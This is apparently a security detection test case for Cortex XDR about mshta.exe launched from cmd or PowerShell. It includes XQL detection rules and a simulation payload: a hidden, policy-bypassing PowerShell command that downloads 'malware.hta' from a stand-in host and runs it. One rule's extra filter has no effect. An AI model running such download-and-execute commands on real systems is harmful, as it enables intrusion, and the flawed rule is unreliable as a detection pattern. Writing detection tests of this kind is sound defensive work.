identity.name: Malicious HTML Application Execution via CMD/PowerShell
identity.summary: An attacker uses cmd or PowerShell to execute a malicious .hta file, which is a common technique for initial access and code execution. Cortex should detect the spawning of mshta.exe from a CMD or Pow
identity.description: An attacker uses cmd or PowerShell to execute a malicious .hta file, which is a common technique for initial access and code execution. Cortex should detect the spawning of mshta.exe from a CMD or PowerShell process.

payload.code:
powershell.exe -NoP -W Hidden -NonI -Exec Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.hta', 'C:\Users\Public\AppData\Roaming\malware.hta')"
mshta.exe C:\Users\Public\AppData\Roaming\malware.hta

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Microsoft HTML Application Host spawns from CMD or PowerShell
biocs.description: Detection of mshta.exe being launched directly from cmd.exe or powershell.exe without intermediate parent processes
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'mshta.exe'
| filter causality_actor_process_image_name in ('cmd.exe', 'powershell.exe')

abiocs.name: Unusual mshta execution from shell context
abiocs.description: Behavioral deviation where mshta.exe is executed directly from shell without typical user interaction patterns
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'mshta.exe'
| filter causality_actor_process_image_name in ('cmd.exe', 'powershell.exe')
| filter not (action_process_image_name contains 'explorer.exe' or action_process_image_name contains 'svchost.exe')

xql_queries.name: Detect mshta from shell
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'mshta.exe'
| filter causality_actor_process_image_name in ('cmd.exe', 'powershell.exe')
| fields agent_hostname, actor_process_image_name, action_process_image_name, causality_actor_process_image_name
